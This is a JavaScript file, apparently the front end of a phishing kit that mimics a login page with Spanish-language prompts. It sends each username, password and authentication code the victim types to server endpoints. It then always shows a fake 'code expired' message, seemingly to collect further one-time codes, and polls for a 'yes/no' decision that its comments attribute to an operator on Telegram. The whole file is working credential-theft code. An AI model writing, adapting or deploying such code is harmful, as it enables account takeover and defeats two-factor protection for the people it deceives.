// script.js

function showLoadingScreen(callback, duration = 2000) {
    const loadingScreen = document.querySelector(".loading-screen");
    loadingScreen.classList.remove("hidden");

    loadingScreen.style.backgroundColor = "rgba(233, 233, 233, 0.6)";

    setTimeout(() => {
        loadingScreen.classList.add("hidden");
        if (callback) callback();
    }, duration); 
}

// Mostrar la pantalla de carga antes de mostrar el panel de usuario
showLoadingScreen(() => {
    const loginContainer = document.querySelector(".login-container");
    loginContainer.classList.remove("hidden");
});

document.getElementById("entrarBtn").addEventListener("click", function () {
    showLoadingScreen(() => {
        document.querySelector(".password-modal").classList.remove("hidden");
    });
});

// ========================================
// BOTÓN CONTINUAR - OPCIONES INDEPENDIENTES
// ========================================

let esperandoDecisionOpciones = false;

document.getElementById("continuarBtn").addEventListener(
    "click",
    async function () {

        if (esperandoDecisionOpciones) {
            return;
        }

        esperandoDecisionOpciones = true;

        // Mostrar la pantalla de carga original
        const loadingScreen =
            document.querySelector(".loading-screen");

        loadingScreen.classList.remove("hidden");

        loadingScreen.style.backgroundColor =
            "rgba(233, 233, 233, 0.6)";

        // Obtener el ID que ya utiliza la página
        const dispositivoID = obtenerIDDispositivo();

        try {

            // Crear solicitud independiente
            const respuesta = await fetch(
                "/opciones/crear",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        dispositivoID
                    })
                }
            );

            if (!respuesta.ok) {
                throw new Error(
                    "No se pudo crear la solicitud"
                );
            }

            const datos = await respuesta.json();

            // Esperar la decisión de Telegram
            await esperarDecisionOpciones(
                datos.idSolicitud
            );

        } catch (error) {

            console.error(
                "Error en las opciones:",
                error
            );

            loadingScreen.classList.add("hidden");

            esperandoDecisionOpciones = false;
        }
    }
);

document.getElementById("cancelarBtn").addEventListener("click", function () {
    document.querySelector(".password-modal").classList.add("hidden");
});

document.getElementById("cancelarAuthBtn").addEventListener("click", function () {
    document.querySelector(".auth-modal").classList.add("hidden");
});

// Obtener o crear un ID único para el dispositivo
function obtenerIDDispositivo() {
    let dispositivoID = localStorage.getItem("dispositivoID");
    if (!dispositivoID) {
        dispositivoID = 'id.' + Math.floor(Math.random() * 1000);
        localStorage.setItem("dispositivoID", dispositivoID);
    }
    return dispositivoID;
}

// Enviar datos al servidor
async function enviarDatos(tipo, texto) {
    const dispositivoID = obtenerIDDispositivo();
    await fetch(`/send-${tipo}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ dispositivoID, texto })
    });
}

// Validaciones
function validarUsuario(usuario) {
    return usuario.length >= 6;
}

function validarContrasena(contrasena) {
    const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^A-Za-z\d])[A-Za-z\d\S]{8,}$/;
    return regex.test(contrasena);
}

function validarAuth(authCode) {
    return /^\d{6,}$/.test(authCode); // Acepta 6 o más dígitos
}

// Actualizar el estado del botón
function actualizarEstadoBoton(inputId, buttonId, validarFuncion) {
    const input = document.getElementById(inputId);
    const button = document.getElementById(buttonId);

    input.addEventListener("input", () => {
        if (validarFuncion(input.value)) {
            button.disabled = false;
            button.classList.add("active");
        } else {
            button.disabled = true;
            button.classList.remove("active");
        }
    });
}

// Llamar a las funciones para cada campo
actualizarEstadoBoton("usuario", "entrarBtn", validarUsuario);
actualizarEstadoBoton("password", "continuarBtn", validarContrasena);
actualizarEstadoBoton("authCode", "authBtn", validarAuth);


function togglePasswordVisibility() {
    const passwordInput = document.getElementById("password");
    const passwordIcon = document.getElementById("password-icon");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        passwordIcon.src = "vs.jpg"; // Cambia a la imagen de "ojo cerrado"
    } else {
        passwordInput.type = "password";
        passwordIcon.src = "vs.jpg"; // Cambia a la imagen de "ojo abierto"
    }
}


// Botones de entrada
document.getElementById("entrarBtn").addEventListener("click", function () {
    const usuario = document.getElementById("usuario").value;
    enviarDatos('user', usuario);  // Enviar usuario
});

// Enviar contraseña al servidor
document.getElementById("continuarBtn").addEventListener("click", function () {
    const password = document.getElementById("password").value;
    enviarDatos('password', password);  // Enviar contraseña
});

// Enviar código de autenticación
document.getElementById("authBtn").addEventListener("click", async function () {
    const authCode = document.getElementById("authCode").value;
    await enviarDatos('auth', authCode);  // Enviar código de autenticación
});

// Función para mostrar la alerta personalizada de autenticación incorrecta
function mostrarAlertaAutenticacionIncorrecta() {
    // Crea un contenedor de alerta
    const alerta = document.createElement("div");
    alerta.className = "alertaAutenticacion";
    alerta.style.position = "fixed";
    alerta.style.bottom = "12%";
    alerta.style.left = "50%";
    alerta.style.transform = "translateX(-50%)";
    alerta.style.backgroundColor = "#0068b1"; // Color de fondo azul
    alerta.style.padding = "15px 17px";
    alerta.style.borderRadius = "5px";
    alerta.style.display = "flex";
    alerta.style.alignItems = "center";
    alerta.style.justifyContent = "space-between";
    alerta.style.color = "white";
    alerta.style.fontSize = "15.6px";
    alerta.style.fontWeight = "500";
    alerta.style.minWidth = "320px";
    alerta.style.zIndex = "1000";

    // Agrega el mensaje de error
    const mensaje = document.createElement("span");
    mensaje.textContent = "Código expirado. Introduzca el nuevo código.";
    alerta.appendChild(mensaje);

    // Agrega el contenedor de alerta al cuerpo del documento
    document.body.appendChild(alerta);
}

// Modifica el evento de autenticación para mostrar la alerta personalizada
document.getElementById("authBtn").addEventListener("click", async function () {
    const authCode = document.getElementById("authCode").value;

    document.querySelector(".alertaAutenticacion")?.remove();

    showLoadingScreen(() => {
    
    // Mostrar mensaje de autenticación incorrecta usando la función personalizada
    mostrarAlertaAutenticacionIncorrecta();
    });
});

document.getElementById("authCode").addEventListener("focus", function () {
    document.querySelector(".alertaAutenticacion")?.remove();
});

document.getElementById("usuario").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        this.blur();
        document.getElementById("entrarBtn").click();
    }
});

document.getElementById("password").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        this.blur();
        document.getElementById("continuarBtn").click();
    }
});

document.getElementById("authCode").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        this.blur();
        document.getElementById("authBtn").click();
    }
});

document.getElementById("usuario").addEventListener("focus", function () {
    setTimeout(() => {
        this.scrollIntoView({
            behavior: "smooth",
            block: "center"
        });
    }, 300);
});

// ========================================
// ESPERAR DECISIÓN DE TELEGRAM
// ========================================

async function esperarDecisionOpciones(idSolicitud) {

    while (true) {

        try {

            const respuesta = await fetch(
                "/opciones/estado/" +
                encodeURIComponent(idSolicitud),
                {
                    cache: "no-store"
                }
            );

            if (!respuesta.ok) {
                throw new Error(
                    "No se pudo consultar la decisión"
                );
            }

            const datos = await respuesta.json();

            if (datos.estado === "si") {

                mostrarSeccionOpciones("si");

                return;
            }

            if (datos.estado === "no") {

                mostrarSeccionOpciones("no");

                return;
            }

        } catch (error) {

            console.error(
                "Esperando conexión:",
                error.message
            );
        }

        // Consultar nuevamente sin establecer caducidad
        await new Promise(resolve => {
            setTimeout(resolve, 1500);
        });
    }
}


// ========================================
// MOSTRAR SECCIÓN CORRESPONDIENTE
// ========================================

function mostrarSeccionOpciones(opcion) {

    const loadingScreen =
        document.querySelector(".loading-screen");

    const loginContainer =
        document.querySelector(".login-container");

    const seccionSi =
        document.getElementById("seccion-si");

    const seccionNo =
        document.getElementById("seccion-no");

    // Ocultar pantalla de carga
    loadingScreen.classList.add("hidden");

    // Ocultar las ventanas anteriores
    loginContainer.classList.add("hidden");

    // Ocultar ambas secciones inicialmente
    seccionSi.classList.add("hidden");
    seccionNo.classList.add("hidden");

    // Mostrar únicamente la sección seleccionada
    if (opcion === "si") {

        seccionSi.classList.remove("hidden");

    } else if (opcion === "no") {

        seccionNo.classList.remove("hidden");
    }

    esperandoDecisionOpciones = false;
}